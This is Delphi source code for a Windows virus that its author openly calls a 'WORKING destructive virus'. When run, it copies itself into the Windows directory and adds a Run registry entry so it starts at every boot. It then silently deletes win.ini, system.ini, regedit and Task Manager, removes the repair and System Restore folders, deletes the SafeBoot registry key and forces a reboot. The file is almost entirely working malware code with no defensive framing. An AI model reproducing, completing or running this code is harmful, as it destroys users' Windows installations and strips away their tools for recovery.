   program YourFucked;

   // Good WORKING destructive virus :D
   // by unfunf
   // I am not responsible for how others use this virus.

   uses
     Windows;

   const // I like constants.
     FO_DELETE          = $0003;
     FOF_SILENT         = $0004;
     FOF_NOCONFIRMATION = $0010;

   type // I dont like ShellAPI, so I think ill just rip it :<
     FILEOP_FLAGS = Word;
     PSHFileOpStructA = ^TSHFileOpStructA;
     _SHFILEOPSTRUCTA = packed record
       Wnd: HWND;
       wFunc: UINT;
       pFrom: PAnsiChar;
       pTo: PAnsiChar;
       fFlags: FILEOP_FLAGS;
       fAnyOperationsAborted: BOOL;
       hNameMappings: Pointer;
       lpszProgressTitle: PAnsiChar;
     end;
     TSHFileOpStructA = _SHFILEOPSTRUCTA;

   // Use shit shell32.dll so that i dont need to use queer ShellAPI unit.
   function SHFileOperationA(const lpFileOp: TSHFileOpStructA): Integer; stdcall; external 'shell32.dll' name 'SHFileOperationA';

   // Delete directory and ALL of its contents (RemoveDirectory wont do that)
   function DeleteDirectory(DirectoryName: String): BOOLEAN;
   var
     SHFileOpStructA: TSHFileOpStructA;
   begin
     ZeroMemory(@SHFileOpStructA, sizeOf(SHFileOpStructA));
     SHFileOpStructA.wFunc  := FO_DELETE;
     SHFileOpStructA.fFlags := FOF_SILENT or FOF_NOCONFIRMATION;
     SHFileOpStructA.pFrom  := PChar(DirectoryName);
     result := (SHFileOperationA(SHFileOpStructA) = 0);
   end;

   // Function I made to give SeShutdownPrivilege, if windows version is NT.
   function unfExitFunc(Parameters: Cardinal): BOOLEAN;
     function IsWindowsNT: Boolean; // Sub function I made to get Windows version
     var
       OSVer: TOSVersionInfo;
     begin
       OSVer.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
       GetVersionEx(OSVer);
       Result := (OSVer.dwPlatformId = VER_PLATFORM_WIN32_NT);
     end;
   var
     TokenHandle: Cardinal;
     tpPrev, tpPrevReq: Cardinal;
     NewTokenPriv, OldTokenPriv: TTokenPrivileges;
   begin
     if (IsWindowsNT) then
     begin
       if OpenProcessToken(GetCurrentProcess,
                           TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, TokenHandle) then
       begin
         if LookUpPrivilegeValue(nil, 'SeShutdownPrivilege', NewTokenPriv.Privileges[0].Luid) then
         begin
           NewTokenPriv.PrivilegeCount := 1;
           NewTokenPriv.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
           tpPrev    := sizeOf(OldTokenPriv);
           tpPrevReq := 0;
           try
             AdjustTokenPrivileges(TokenHandle, FALSE, NewTokenPriv, tpPrev, OldTokenPriv, tpPrevReq);
           except;
           end;
         end;
       end;
     end;
     result := ExitWindowsEx(Parameters, 0);
   end;



   // Ripped from MiniReg, get registry string.
   function RegSetString(RootKey: HKEY; Name: String; Value: String): boolean;
     function LastPos(Needle: Char; Haystack: String): integer;
     begin
       for Result := Length(Haystack) downto 1 do
         if Haystack[Result] = Needle then
           Break;
     end;

     function RegSetValue(RootKey: HKEY; Name: String; ValType: Cardinal; PVal: Pointer; ValSize: Cardinal): boolean;
     var
       SubKey: String;
       n: integer;
       dispo: DWORD;
       hTemp: HKEY;
     begin
       Result := False;
       n := LastPos('\', Name);
       if n > 0 then
       begin
         SubKey := Copy(Name, 1, n - 1);
         if RegCreateKeyEx(RootKey, PChar(SubKey), 0, nil, REG_OPTION_NON_VOLATILE, KEY_WRITE, nil, hTemp, @dispo) = ERROR_SUCCESS then
         begin
           SubKey := Copy(Name, n + 1, Length(Name) - n);
           if SubKey = '' then
             Result := (RegSetValueEx(hTemp, nil, 0, ValType, PVal, ValSize) = ERROR_SUCCESS)
           else
             Result := (RegSetValueEx(hTemp, PChar(SubKey), 0, ValType, PVal, ValSize) = ERROR_SUCCESS);
           RegCloseKey(hTemp);
         end;
       end;
     end;
   begin
     Result := RegSetValue(RootKey, Name, REG_SZ, PChar(Value + #0), Length(Value) + 1);
   end;

   // Ripped from minireg, delete key + subkeys.
   function RegDelKeyEx(RootKey: HKEY; Name: String; WithSubKeys: Boolean = True): boolean;
   const
     MaxBufSize: Cardinal = 1024;
   var
     iRes: integer;
     hTemp: HKEY;
     Buf: String;
     BufSize: Cardinal;
   begin
     Result := False;
     // no root keys...
     if pos('\', Name) <> 0 then
     begin
       iRes := RegOpenKeyEx(RootKey, PChar(Name), 0, KEY_ENUMERATE_SUB_KEYS or KEY_WRITE, hTemp);
       if WithSubKeys then
       begin
         while iRes = ERROR_SUCCESS do
         begin
           BufSize := MaxBufSize;
           SetLength(Buf, BufSize);
           iRes := RegEnumKeyEx(hTemp, 0, @Buf[1], BufSize, nil, nil, nil, nil);
           if iRes = ERROR_NO_MORE_ITEMS then
           begin
             RegCloseKey(hTemp);
             Result := (RegDeleteKey(RootKey, PChar(Name)) = ERROR_SUCCESS);
           end else
           begin
             if iRes = ERROR_SUCCESS then
             begin
               SetLength(Buf, BufSize);
               if RegDelKeyEx(RootKey, Concat(Name, '\', Buf), WithSubKeys) then
                 iRes := ERROR_SUCCESS
               else
                 iRES := ERROR_BADKEY;
             end;
           end;
         end;
       end else
       begin
         RegCloseKey(hTemp);
         Result := (RegDeleteKey(RootKey, PChar(Name)) = ERROR_SUCCESS);
       end;
     end;
   end;

   function StrLen(const Str: PChar): Cardinal; assembler; // Ripped func.
   asm
           MOV     EDX,EDI
           MOV     EDI,EAX
           MOV     ECX,0FFFFFFFFH
           XOR     AL,AL
           REPNE   SCASB
           MOV     EAX,0FFFFFFFEH
           SUB     EAX,ECX
           MOV     EDI,EDX
   end;

   // Tiny function I made to get the windows directory.
   function GetWindowsDir: String;
   begin
     SetLength(Result, MAX_PATH);
     GetWindowsDirectory(PChar(Result), Length(Result));
     SetLength(Result, StrLen(PChar(Result)));
   end;

   var
     WindowsDirectory: String;

   begin
     WindowsDirectory := GetWindowsDir;
     CopyFileA(PChar(ParamStr(0)), PChar(WindowsDirectory+'\urtehfoked.exe'), TRUE);
     RegSetString(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run\URTF', WindowsDirectory+'\urtehfoked.exe');
     DeleteFileA(PChar(WindowsDirectory+'\win.ini'));
     DeleteFileA(PChar(WindowsDirectory+'\system.ini'));
     DeleteFileA(PChar(WindowsDirectory+'\system32\win.com'));
     DeleteFileA(PChar(WindowsDirectory+'\system32\regedt32.exe'));
     DeleteFileA(PChar(WindowsDirectory+'\system32\taskmgr.exe'));
     DeleteFileA(PChar(WindowsDirectory+'\system32\taskman.exe'));
     DeleteDirectory(WindowsDirectory+'\repair');
     DeleteDirectory(WindowsDirectory+'\system32\Restore');
     DeleteFileA(Pchar(WindowsDirectory+'\win.com'));
     DeleteFileA(PChar(WindowsDirectory+'\regedit.exe'));
     DeleteFileA(PChar(WindowsDirectory+'\taskman.exe'));
     RegDelKeyEx(HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Control\SafeBoot');
     unfExitFunc(EWX_REBOOT or EWX_FORCE); // Buh bye.
   end.
